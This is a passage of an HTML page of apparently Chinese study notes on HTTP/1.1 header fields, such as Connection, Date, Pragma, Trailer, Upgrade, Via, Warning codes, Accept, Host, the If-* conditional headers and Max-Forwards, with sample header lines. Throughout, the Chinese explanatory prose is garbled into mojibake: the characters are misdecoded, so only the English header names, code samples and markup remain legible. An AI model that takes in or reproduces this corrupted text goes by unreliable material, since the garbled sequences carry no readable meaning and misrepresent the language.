ä¸å†è½¬å‘çš„é¦–éƒ¨å­—æ®µå</code></p><p><img src="https://z3.ax1x.com/2021/04/21/cHInJ0.png" alt="cHInJ0.png"></p></li><li><p>ç®¡ç†æŒä¹…è¿æ¥</p><p>HTTP/1.1 ä¹‹å‰çš„ HTTP ç‰ˆæœ¬çš„é»˜è®¤è¿æ¥éƒ½æ˜¯éæŒä¹…è¿æ¥ã€‚ä¸ºæ­¤ï¼Œå¦‚æœæƒ³åœ¨æ—§ç‰ˆæœ¬çš„ HTTP åè®®ä¸Šç»´æŒæŒç»­è¿æ¥ï¼Œåˆ™éœ€è¦æŒ‡å®šConnection é¦–éƒ¨å­—æ®µçš„å€¼ä¸º Keep-Aliveã€‚<code>Connection: Keep-Alive</code></p><p><img src="https://z3.ax1x.com/2021/04/21/cHIuWV.png" alt="cHIuWV.png"></p><p>HTTP/1.1 ç‰ˆæœ¬çš„é»˜è®¤è¿æ¥éƒ½æ˜¯æŒä¹…è¿æ¥ã€‚ä¸ºæ­¤ï¼Œå®¢æˆ·ç«¯ä¼šåœ¨æŒä¹…è¿æ¥ä¸Šè¿ç»­å‘é€è¯·æ±‚ã€‚å½“æœåŠ¡å™¨ç«¯æƒ³æ˜ç¡®æ–­å¼€è¿æ¥æ—¶ï¼Œåˆ™æŒ‡å®šConnection é¦–éƒ¨å­—æ®µçš„å€¼ä¸º Closeã€‚<code>Connection: close</code></p></li></ul><h4 id="Date"><a href="#Date" class="headerlink" title="Date"></a>Date</h4><p>é¦–éƒ¨å­—æ®µ Date è¡¨æ˜åˆ›å»º HTTP æŠ¥æ–‡çš„æ—¥æœŸå’Œæ—¶é—´ã€‚</p><ul><li><p>HTTP/1.1 åè®®ä½¿ç”¨åœ¨ RFC1123 ä¸­è§„å®šçš„æ—¥æœŸæ—¶é—´çš„æ ¼å¼</p><p><code>Date: Tue, 03 Jul 2012 04:40:59 GMT</code></p></li><li><p>ä¹‹å‰çš„ HTTP åè®®ç‰ˆæœ¬ä¸­ä½¿ç”¨åœ¨ RFC850 ä¸­å®šä¹‰çš„æ ¼å¼</p><p><code>Date: Tue, 03-Jul-12 04:40:59 GMT</code></p></li><li><p>C æ ‡å‡†åº“å†…çš„ asctime() å‡½æ•°çš„è¾“å‡ºæ ¼å¼</p><p><code>Date: Tue Jul 03 04:40:59 2012</code></p></li></ul><h4 id="Pragma"><a href="#Pragma" class="headerlink" title="Pragma"></a>Pragma</h4><p>Pragma æ˜¯ HTTP/1.1 ä¹‹å‰ç‰ˆæœ¬çš„å†å²é—ç•™å­—æ®µï¼Œä»…ä½œä¸ºä¸ HTTP/1.0çš„å‘åå…¼å®¹è€Œå®šä¹‰ã€‚ç›¸å½“äºHTTP/1.1ä¹‹åCache-Control</p><p><code>Pragma: no-cache</code></p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">no-cache </span></span><span class="token header"><span class="token header-name keyword">Pragma</span><span class="token punctuation">:</span> <span class="token header-value">no-cache</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>é€šå¸¸ä¸€èµ·ç”¨ï¼Œå› ä¸ºä½ ä¸èƒ½æŒæ¡å…¨éƒ¨ä¸­é—´æœåŠ¡å™¨</p><h4 id="Trailer"><a href="#Trailer" class="headerlink" title="Trailer"></a>Trailer</h4><p>é¦–éƒ¨å­—æ®µ Trailer ä¼šäº‹å…ˆè¯´æ˜åœ¨æŠ¥æ–‡ä¸»ä½“åè®°å½•äº†å“ªäº›é¦–éƒ¨å­—æ®µã€‚è¯¥é¦–éƒ¨å­—æ®µå¯åº”ç”¨åœ¨ HTTP/1.1 ç‰ˆæœ¬åˆ†å—ä¼ è¾“ç¼–ç æ—¶ã€‚</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span><span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Tue, 03 Jul 2012 04:40:56 GMT</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html</span></span><span class="token text-html">...Transfer-Encoding: chunkedTrailer: Expires...(æŠ¥æ–‡ä¸»ä½“)... 0Expires: Tue, 28 Sep 2004 23:59:59 GMT</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»¥ä¸Šç”¨ä¾‹ä¸­ï¼ŒæŒ‡å®šé¦–éƒ¨å­—æ®µ Trailer çš„å€¼ä¸º Expiresï¼Œåœ¨æŠ¥æ–‡ä¸»ä½“ä¹‹åï¼ˆåˆ†å—é•¿åº¦ 0 ä¹‹åï¼‰å‡ºç°äº†é¦–éƒ¨å­—æ®µ Expiresã€‚</p><h4 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h4><p>é¦–éƒ¨å­—æ®µ Transfer-Encoding è§„å®šäº†ä¼ è¾“æŠ¥æ–‡ä¸»ä½“æ—¶é‡‡ç”¨çš„ç¼–ç æ–¹å¼ã€‚</p><p>HTTP/1.1 çš„ä¼ è¾“ç¼–ç æ–¹å¼ä»…å¯¹åˆ†å—ä¼ è¾“ç¼–ç æœ‰æ•ˆã€‚</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span><span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Tue, 03 Jul 2012 04:40:56 GMT</span></span><span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">public, max-age=604800 </span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/javascript; charset=utf-8 </span></span><span class="token header"><span class="token header-name keyword">Expires</span><span class="token punctuation">:</span> <span class="token header-value">Tue, 10 Jul 2012 04:40:56 GMT</span></span><span class="token header"><span class="token header-name keyword">X-Frame-Options</span><span class="token punctuation">:</span> <span class="token header-value">DENY</span></span><span class="token header"><span class="token header-name keyword">X-XSS-Protection</span><span class="token punctuation">:</span> <span class="token header-value">1; mode=block </span></span><span class="token header"><span class="token header-name keyword">Content-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip </span></span><span class="token header"><span class="token header-name keyword">Transfer-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">chunked </span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">keep-alive</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Upgrade"><a href="#Upgrade" class="headerlink" title="Upgrade"></a>Upgrade</h4><p>é¦–éƒ¨å­—æ®µ Upgrade ç”¨äºæ£€æµ‹ HTTP åè®®åŠå…¶ä»–åè®®æ˜¯å¦å¯ä½¿ç”¨æ›´é«˜çš„ç‰ˆæœ¬è¿›è¡Œé€šä¿¡ï¼Œå…¶å‚æ•°å€¼å¯ä»¥ç”¨æ¥æŒ‡å®šä¸€ä¸ªå®Œå…¨ä¸åŒçš„é€šä¿¡åè®®ã€‚</p><p><img src="https://z3.ax1x.com/2021/04/21/cHIKzT.png" alt="cHIKzT.png"></p><p>ä¸Šå›¾ç”¨ä¾‹ä¸­ï¼Œé¦–éƒ¨å­—æ®µ Upgrade æŒ‡å®šçš„å€¼ä¸º TLS/1.0ã€‚è¯·æ³¨æ„æ­¤å¤„ä¸¤ä¸ªå­—æ®µé¦–éƒ¨å­—æ®µçš„å¯¹åº”å…³ç³»ï¼ŒConnection çš„å€¼è¢«æŒ‡å®šä¸º Upgradeã€‚Upgrade é¦–éƒ¨å­—æ®µäº§ç”Ÿä½œç”¨çš„ Upgrade å¯¹è±¡ä»…é™äºå®¢æˆ·ç«¯å’Œé‚»æ¥æœåŠ¡å™¨ä¹‹é—´ã€‚å› æ­¤ï¼Œä½¿ç”¨é¦–éƒ¨å­—æ®µ Upgrade æ—¶ï¼Œè¿˜éœ€è¦é¢å¤–æŒ‡å®šConnection:Upgradeã€‚</p><p>å¯¹äºé™„æœ‰é¦–éƒ¨å­—æ®µ Upgrade çš„è¯·æ±‚ï¼ŒæœåŠ¡å™¨å¯ç”¨ 101 Switching Protocols çŠ¶æ€ç ä½œä¸ºå“åº”è¿”å›ã€‚</p><h4 id="Via"><a href="#Via" class="headerlink" title="Via"></a>Via</h4><p>ä½¿ç”¨é¦–éƒ¨å­—æ®µ Via æ˜¯ä¸ºäº†è¿½è¸ªå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´çš„è¯·æ±‚å’Œå“åº”æŠ¥æ–‡çš„ä¼ è¾“è·¯å¾„ã€‚</p><p><img src="https://z3.ax1x.com/2021/04/21/cHIQQU.png" alt="cHIQQU.png"></p><p>é¦–éƒ¨å­—æ®µ Via ä¸ä»…ç”¨äºè¿½è¸ªæŠ¥æ–‡çš„è½¬å‘ï¼Œè¿˜å¯é¿å…è¯·æ±‚å›ç¯çš„å‘ç”Ÿã€‚æ‰€ä»¥å¿…é¡»åœ¨ç»è¿‡ä»£ç†æ—¶é™„åŠ è¯¥é¦–éƒ¨å­—æ®µå†…å®¹ã€‚</p><p>1.0æ˜¯æŒ‡ä»£ç†æœåŠ¡å™¨çš„HTTPç‰ˆæœ¬</p><h4 id="Warning"><a href="#Warning" class="headerlink" title="Warning"></a>Warning</h4><p>HTTP/1.1 çš„ Warning é¦–éƒ¨æ˜¯ä» HTTP/1.0 çš„å“åº”é¦–éƒ¨ï¼ˆRetry-Afterï¼‰æ¼”å˜è¿‡æ¥çš„ã€‚è¯¥é¦–éƒ¨é€šå¸¸ä¼šå‘ŠçŸ¥ç”¨æˆ·ä¸€äº›ä¸ç¼“å­˜ç›¸å…³çš„é—®é¢˜çš„è­¦å‘Šã€‚</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Warning</span><span class="token punctuation">:</span> <span class="token header-value">[è­¦å‘Šç ][è­¦å‘Šçš„ä¸»æœº:ç«¯å£å·]â€œ[è­¦å‘Šå†…å®¹]â€([æ—¥æœŸæ—¶é—´])</span></span><span class="token header"><span class="token header-name keyword">Warning</span><span class="token punctuation">:</span> <span class="token header-value">113 gw.hackr.jp:8080 "Heuristic expiration" Tue, 03</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="HTTP-1-1-è­¦å‘Šç "><a href="#HTTP-1-1-è­¦å‘Šç " class="headerlink" title="HTTP/1.1 è­¦å‘Šç "></a><strong>HTTP/1.1</strong> è­¦å‘Šç </h5><table><thead><tr><th>è­¦å‘Šç </th><th>è­¦å‘Šå†…å®¹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>110</td><td>Response  is staleï¼ˆå“åº”å·²è¿‡æœŸï¼‰</td><td>ä»£ç†è¿”å›å·²è¿‡æœŸçš„èµ„æº</td></tr><tr><td>111</td><td>Revalidation  failedï¼ˆå†éªŒè¯å¤±è´¥ï¼‰</td><td>ä»£ç†å†éªŒè¯èµ„æºæœ‰æ•ˆæ€§æ—¶å¤±è´¥ï¼ˆæœåŠ¡å™¨æ— æ³•åˆ°è¾¾ç­‰åŸå› ï¼‰</td></tr><tr><td>112</td><td>Disconnection operationï¼ˆæ–­å¼€è¿æ¥æ“ä½œï¼‰</td><td>ä»£ç†ä¸äº’è”ç½‘è¿æ¥è¢«æ•…æ„åˆ‡æ–­</td></tr><tr><td>113</td><td>Heuristic  expirationï¼ˆè¯•æ¢æ€§è¿‡æœŸï¼‰</td><td>å“åº”çš„ä½¿ç”¨æœŸè¶…è¿‡24å°æ—¶ï¼ˆæœ‰æ•ˆç¼“å­˜çš„è®¾å®šæ—¶é—´å¤§äº24å°æ—¶çš„æƒ…å†µä¸‹ï¼‰</td></tr><tr><td>199</td><td>Miscellaneous  warningï¼ˆæ‚é¡¹è­¦å‘Šï¼‰</td><td>ä»»æ„çš„è­¦å‘Šå†…å®¹</td></tr><tr><td>214</td><td>Transformation  appliedï¼ˆä½¿ç”¨äº†è½¬æ¢ï¼‰</td><td>ä»£ç†å¯¹å†…å®¹ç¼–ç æˆ–åª’ä½“ç±»å‹ç­‰æ‰§è¡Œäº†æŸäº›å¤„ç†æ—¶</td></tr><tr><td>299</td><td>Miscellaneous persistent  warningï¼ˆæŒä¹…æ‚é¡¹è­¦å‘Šï¼‰</td><td>ä»»æ„çš„è­¦å‘Šå†…å®¹</td></tr></tbody></table><h3 id="è¯·æ±‚é¦–éƒ¨å­—æ®µ-1"><a href="#è¯·æ±‚é¦–éƒ¨å­—æ®µ-1" class="headerlink" title="è¯·æ±‚é¦–éƒ¨å­—æ®µ"></a>è¯·æ±‚é¦–éƒ¨å­—æ®µ</h3><p>è¯·æ±‚é¦–éƒ¨å­—æ®µæ˜¯ä»å®¢æˆ·ç«¯å¾€æœåŠ¡å™¨ç«¯å‘é€è¯·æ±‚æŠ¥æ–‡ä¸­æ‰€ä½¿ç”¨çš„å­—æ®µï¼Œ ç”¨äºè¡¥å……è¯·æ±‚çš„é™„åŠ ä¿¡æ¯ã€å®¢æˆ·ç«¯ä¿¡æ¯ã€å¯¹å“åº”å†…å®¹ç›¸å…³çš„ä¼˜å…ˆçº§ç­‰å†…å®¹ã€‚</p><h4 id="Accept"><a href="#Accept" class="headerlink" title="Accept"></a>Accept</h4><p><img src="https://z3.ax1x.com/2021/04/21/cHIlyF.png" alt="cHIlyF.png"></p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>æ–‡æœ¬æ–‡ä»¶</p><p>text/html, text/plain, text/css â€¦ </p><p>application/xhtml+xml, application/xml â€¦</p></li><li><p>å›¾ç‰‡æ–‡ä»¶</p><p>image/jpeg, image/gif, image/png â€¦</p></li><li><p>è§†é¢‘æ–‡ä»¶</p><p>video/mpeg, video/quicktime â€¦</p></li><li><p>åº”ç”¨ç¨‹åºä½¿ç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶</p><p>application/octet-stream, application/zip â€¦</p></li></ul><p>æ¯”å¦‚ï¼Œå¦‚æœæµè§ˆå™¨ä¸æ”¯æŒ PNG å›¾ç‰‡çš„æ˜¾ç¤ºï¼Œé‚£ Accept å°±ä¸æŒ‡å®šimage/pngï¼Œè€ŒæŒ‡å®šå¯å¤„ç†çš„ image/gif å’Œ image/jpeg ç­‰å›¾ç‰‡ç±»å‹ã€‚</p><p>è‹¥æƒ³è¦ç»™æ˜¾ç¤ºçš„åª’ä½“ç±»å‹å¢åŠ ä¼˜å…ˆçº§ï¼Œåˆ™ä½¿ç”¨ q= æ¥é¢å¤–è¡¨ç¤ºæƒé‡å€¼1ï¼Œç”¨åˆ†ï¼ˆ;ï¼‰è¿›è¡Œåˆ†éš”ã€‚æƒé‡å€¼ q çš„èŒƒå›´æ˜¯ 0~1ï¼ˆå¯ç²¾ç¡®åˆ°å°æ•°ç‚¹å 3 ä½ï¼‰ï¼Œä¸” 1 ä¸ºæœ€å¤§å€¼ã€‚ä¸æŒ‡å®šæƒé‡ q å€¼æ—¶ï¼Œé»˜è®¤æƒé‡ä¸º q=1.0ã€‚</p><h4 id="Accept-Charset"><a href="#Accept-Charset" class="headerlink" title="Accept-Charset"></a>Accept-Charset</h4><p><img src="https://z3.ax1x.com/2021/04/21/cHI1L4.png" alt="cHI1L4.png"></p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Accept-Charset</span><span class="token punctuation">:</span> <span class="token header-value">iso-8859-5, unicode-1-1;q=0.8</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Accept-Encoding"><a href="#Accept-Encoding" class="headerlink" title="Accept-Encoding"></a>Accept-Encoding</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Accept-Encoding é¦–éƒ¨å­—æ®µç”¨æ¥å‘ŠçŸ¥æœåŠ¡å™¨ç”¨æˆ·ä»£ç†æ”¯æŒçš„å†…å®¹ç¼–ç åŠå†…å®¹ç¼–ç çš„ä¼˜å…ˆçº§é¡ºåºã€‚å¯ä¸€æ¬¡æ€§æŒ‡å®šå¤šç§å†…å®¹ç¼–ç ã€‚</p><ul><li>gzip</li><li>compress</li><li>deflate</li><li>identity</li></ul><p>ä¹Ÿèƒ½ä½¿ç”¨æƒé‡qï¼Œä½¿ç”¨<code>*</code>ä½œä¸ºé€šé…ç¬¦</p><h4 id="Accept-Language"><a href="#Accept-Language" class="headerlink" title="Accept-Language"></a>Accept-Language</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-cn,zh;q=0.7,en-us,en;q=0.3</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ Accept-Language ç”¨æ¥å‘ŠçŸ¥æœåŠ¡å™¨ç”¨æˆ·ä»£ç†èƒ½å¤Ÿå¤„ç†çš„è‡ªç„¶è¯­è¨€é›†ï¼ˆæŒ‡ä¸­æ–‡æˆ–è‹±æ–‡ç­‰ï¼‰ï¼Œä»¥åŠè‡ªç„¶è¯­è¨€é›†çš„ç›¸å¯¹ä¼˜å…ˆçº§ã€‚å¯ä¸€æ¬¡æŒ‡å®šå¤šç§è‡ªç„¶è¯­è¨€é›†ã€‚</p><h4 id="Authorization"><a href="#Authorization" class="headerlink" title="Authorization"></a>Authorization</h4><p><img src="https://z3.ax1x.com/2021/04/21/cHI8eJ.png" alt="cHI8eJ.png"></p><p>é¦–éƒ¨å­—æ®µ Authorization æ˜¯ç”¨æ¥å‘ŠçŸ¥æœåŠ¡å™¨ï¼Œç”¨æˆ·ä»£ç†çš„è®¤è¯ä¿¡æ¯ï¼ˆè¯ä¹¦å€¼ï¼‰ã€‚é€šå¸¸ï¼Œæƒ³è¦é€šè¿‡æœåŠ¡å™¨è®¤è¯çš„ç”¨æˆ·ä»£ç†ä¼šåœ¨æ¥æ”¶åˆ°è¿”å›çš„401 çŠ¶æ€ç å“åº”åï¼ŒæŠŠé¦–éƒ¨å­—æ®µ Authorization åŠ å…¥è¯·æ±‚ä¸­ã€‚å…±ç”¨ç¼“å­˜åœ¨æ¥æ”¶åˆ°å«æœ‰ Authorization é¦–éƒ¨å­—æ®µçš„è¯·æ±‚æ—¶çš„æ“ä½œå¤„ç†ä¼šç•¥æœ‰å·®å¼‚ã€‚</p><h4 id="Expect"><a href="#Expect" class="headerlink" title="Expect"></a>Expect</h4><p><img src="https://z3.ax1x.com/2021/04/21/cHIGw9.png" alt="cHIGw9.png"></p><p>å®¢æˆ·ç«¯ä½¿ç”¨é¦–éƒ¨å­—æ®µ Expect æ¥å‘ŠçŸ¥æœåŠ¡å™¨ï¼ŒæœŸæœ›å‡ºç°çš„æŸç§ç‰¹å®šè¡Œä¸ºã€‚å› æœåŠ¡å™¨æ— æ³•ç†è§£å®¢æˆ·ç«¯çš„æœŸæœ›ä½œå‡ºå›åº”è€Œå‘ç”Ÿé”™è¯¯æ—¶ï¼Œä¼šè¿”å›çŠ¶æ€ç  417 Expectation Failedã€‚</p><p>å®¢æˆ·ç«¯å¯ä»¥åˆ©ç”¨è¯¥é¦–éƒ¨å­—æ®µï¼Œå†™æ˜æ‰€æœŸæœ›çš„æ‰©å±•ã€‚</p><h4 id="From"><a href="#From" class="headerlink" title="From"></a>From</h4><p><img src="https://z3.ax1x.com/2021/04/21/cHIJoR.png" alt="cHIJoR.png"></p><p>é¦–éƒ¨å­—æ®µ From ç”¨æ¥å‘ŠçŸ¥æœåŠ¡å™¨ä½¿ç”¨ç”¨æˆ·ä»£ç†çš„ç”¨æˆ·çš„ç”µå­é‚®ä»¶åœ°å€ã€‚é€šå¸¸ï¼Œå…¶ä½¿ç”¨ç›®çš„å°±æ˜¯ä¸ºäº†æ˜¾ç¤ºæœç´¢å¼•æ“ç­‰ç”¨æˆ·ä»£ç†çš„è´Ÿè´£äººçš„ç”µå­é‚®ä»¶è”ç³»æ–¹å¼ã€‚ä½¿ç”¨ä»£ç†æ—¶ï¼Œåº”å°½å¯èƒ½åŒ…å« From é¦–éƒ¨å­—æ®µï¼ˆä½†å¯èƒ½ä¼šå› ä»£ç†ä¸åŒï¼Œå°†ç”µå­é‚®ä»¶åœ°å€è®°å½•åœ¨ User-Agent é¦–éƒ¨å­—æ®µå†…ï¼‰ã€‚</p><h4 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">www.hackr.jp</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ Host ä¼šå‘ŠçŸ¥æœåŠ¡å™¨ï¼Œè¯·æ±‚çš„èµ„æºæ‰€å¤„çš„äº’è”ç½‘ä¸»æœºåå’Œç«¯å£å·ã€‚Host é¦–éƒ¨å­—æ®µåœ¨ HTTP/1.1 è§„èŒƒå†…æ˜¯å”¯ä¸€ä¸€ä¸ªå¿…é¡»è¢«åŒ…å«åœ¨è¯·æ±‚å†…çš„é¦–éƒ¨å­—æ®µã€‚</p><p>è™šæ‹Ÿä¸»æœºè¿è¡Œåœ¨åŒä¸€ä¸ª <strong>IP</strong> ä¸Šï¼Œå› æ­¤ä½¿ç”¨é¦–éƒ¨å­—æ®µ <strong>Host</strong> åŠ ä»¥åŒºåˆ†</p><p>è‹¥æœåŠ¡å™¨æœªè®¾å®šä¸»æœºåï¼Œé‚£ç›´æ¥å‘é€ä¸€ä¸ªç©ºå€¼å³å¯ã€‚</p><h4 id="If-XXX"><a href="#If-XXX" class="headerlink" title="If-XXX"></a>If-XXX</h4><p>å½¢å¦‚ If-xxx è¿™ç§æ ·å¼çš„è¯·æ±‚é¦–éƒ¨å­—æ®µï¼Œéƒ½å¯ç§°ä¸ºæ¡ä»¶è¯·æ±‚ã€‚æœåŠ¡å™¨æ¥æ”¶åˆ°é™„å¸¦æ¡ä»¶çš„è¯·æ±‚åï¼Œåªæœ‰åˆ¤æ–­æŒ‡å®šæ¡ä»¶ä¸ºçœŸæ—¶ï¼Œæ‰ä¼šæ‰§è¡Œè¯·æ±‚ã€‚</p><p><img src="https://z3.ax1x.com/2021/04/21/cHItF1.png" alt="cHItF1.png"></p><h4 id="If-Match"><a href="#If-Match" class="headerlink" title="If-Match"></a>If-Match</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">If-Match</span><span class="token punctuation">:</span> <span class="token header-value">"123456"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ If-Matchï¼Œå±é™„å¸¦æ¡ä»¶ä¹‹ä¸€ï¼Œå®ƒä¼šå‘ŠçŸ¥æœåŠ¡å™¨åŒ¹é…èµ„æºæ‰€ç”¨çš„å®ä½“æ ‡è®°ï¼ˆETagï¼‰å€¼ã€‚</p><p>æœåŠ¡å™¨ä¼šæ¯”å¯¹ If-Match çš„å­—æ®µå€¼å’Œèµ„æºçš„ ETag å€¼ï¼Œä»…å½“ä¸¤è€…ä¸€è‡´æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œè¯·æ±‚ã€‚åä¹‹ï¼Œåˆ™è¿”å›çŠ¶æ€ç  412 Precondition Failed çš„å“åº”ã€‚</p><p>é€šé…ç¬¦<code>*</code>è·³è¿‡åŒ¹é…</p><h4 id="If-Modified-Since"><a href="#If-Modified-Since" class="headerlink" title="If-Modified-Since"></a>If-Modified-Since</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">If-Modified-Since</span><span class="token punctuation">:</span> <span class="token header-value">Thu, 15 Apr 2004 00:00:00 GMT</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ If-Modified-Sinceï¼Œå±é™„å¸¦æ¡ä»¶ä¹‹ä¸€ï¼Œå®ƒä¼šå‘ŠçŸ¥æœåŠ¡å™¨è‹¥ If- Modified-Since å­—æ®µå€¼æ—©äºèµ„æºçš„æ›´æ–°æ—¶é—´ï¼Œåˆ™å¸Œæœ›èƒ½å¤„ç†è¯¥è¯·æ±‚ã€‚è€Œåœ¨æŒ‡å®š If-Modified-Since å­—æ®µå€¼çš„æ—¥æœŸæ—¶é—´ä¹‹åï¼Œå¦‚æœè¯·æ±‚çš„èµ„æºéƒ½æ²¡æœ‰è¿‡æ›´æ–°ï¼Œåˆ™è¿”å›çŠ¶æ€ç  304 Not Modified çš„å“åº”ã€‚</p><p>If-Modified-Since ç”¨äºç¡®è®¤ä»£ç†æˆ–å®¢æˆ·ç«¯æ‹¥æœ‰çš„æœ¬åœ°èµ„æºçš„æœ‰æ•ˆæ€§ã€‚è·å–èµ„æºçš„æ›´æ–°æ—¥æœŸæ—¶é—´ï¼Œå¯é€šè¿‡ç¡®è®¤é¦–éƒ¨å­—æ®µ Last-Modified æ¥ç¡®å®šã€‚</p><h4 id="If-None-Match"><a href="#If-None-Match" class="headerlink" title="If-None-Match"></a>If-None-Match</h4><p><img src="https://z3.ax1x.com/2021/04/21/cHIUW6.png" alt="cHIUW6.png"></p><p>å®ƒå’Œé¦–éƒ¨å­—æ®µ If-Match ä½œç”¨ç›¸åã€‚</p><p>åœ¨ GET æˆ– HEAD æ–¹æ³•ä¸­ä½¿ç”¨é¦–éƒ¨å­—æ®µ If-None-Match å¯è·å–æœ€æ–°çš„èµ„æºã€‚å› æ­¤ï¼Œè¿™ä¸ä½¿ç”¨é¦–éƒ¨å­—æ®µ If-Modified-Since æ—¶æœ‰äº›ç±»ä¼¼ã€‚</p><h4 id="If-Range"><a href="#If-Range" class="headerlink" title="If-Range"></a>If-Range</h4><p>é¦–éƒ¨å­—æ®µ If-Range å±äºé™„å¸¦æ¡ä»¶ä¹‹ä¸€ã€‚å®ƒå‘ŠçŸ¥æœåŠ¡å™¨è‹¥æŒ‡å®šçš„ If- Range å­—æ®µå€¼ï¼ˆETag å€¼æˆ–è€…æ—¶é—´ï¼‰å’Œè¯·æ±‚èµ„æºçš„ ETag å€¼æˆ–æ—¶é—´ç›¸ä¸€è‡´æ—¶ï¼Œåˆ™ä½œä¸ºèŒƒå›´è¯·æ±‚å¤„ç†ã€‚åä¹‹ï¼Œåˆ™è¿”å›å…¨ä½“èµ„æºã€‚</p><p><img src="https://z3.ax1x.com/2021/04/21/cHIdSK.png" alt="cHIdSK.png"></p><p><img src="https://z3.ax1x.com/2021/04/21/cHIwQO.png" alt="cHIwQO.png"></p><h4 id="If-Unmodified-Since"><a href="#If-Unmodified-Since" class="headerlink" title="If-Unmodified-Since"></a>If-Unmodified-Since</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">If-Unmodified-Since</span><span class="token punctuation">:</span> <span class="token header-value">Thu, 03 Jul 2012 00:00:00 GMT</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é¦–éƒ¨å­—æ®µ If-Unmodified-Since å’Œé¦–éƒ¨å­—æ®µ If-Modified-Since çš„ä½œç”¨ç›¸åã€‚å®ƒçš„ä½œç”¨çš„æ˜¯å‘ŠçŸ¥æœåŠ¡å™¨ï¼ŒæŒ‡å®šçš„è¯·æ±‚èµ„æºåªæœ‰åœ¨å­—æ®µå€¼å†…æŒ‡å®šçš„æ—¥æœŸæ—¶é—´ä¹‹åï¼Œæœªå‘ç”Ÿæ›´æ–°çš„æƒ…å†µä¸‹ï¼Œæ‰èƒ½å¤„ç†è¯·æ±‚ã€‚å¦‚æœåœ¨æŒ‡å®šæ—¥æœŸæ—¶é—´åå‘ç”Ÿäº†æ›´æ–°ï¼Œåˆ™ä»¥çŠ¶æ€ç  412 Precondition Failed ä½œä¸ºå“åº”è¿”å›ã€‚</p><h4 id="Max-Forwards"><a href="#Max-Forwards" class="headerlink" title="Max-Forwards"></a>Max-Forwards</h4><p><img src="https://z3.ax1x.com/2021/04/21/cHI0yD.png" alt="cHI0yD.png"></p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Max-Forwards</span><span class="token punctuation">:</span> <span class="token header-value">10</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ¯æ¬¡è½¬å‘æ•°å€¼å‡ <strong>1</strong>ã€‚å½“æ•°å€¼å˜ <strong>0</strong> æ—¶è¿”å›å“åº”</p><p>é€šè¿‡ TRACE æ–¹æ³•æˆ– OPTIONS æ–¹æ³•ï¼Œå‘é€åŒ…å«é¦–éƒ¨å­—æ®µ Max- Forwards çš„è¯·æ±‚æ—¶ï¼Œè¯¥å­—æ®µä»¥åè¿›åˆ¶æ•´æ•°å½¢å¼æŒ‡å®šå¯ç»è¿‡çš„æœåŠ¡å™¨æœ€å¤§æ•°ç›®ã€‚</p><h4 id="Proxy-Authorization"><a 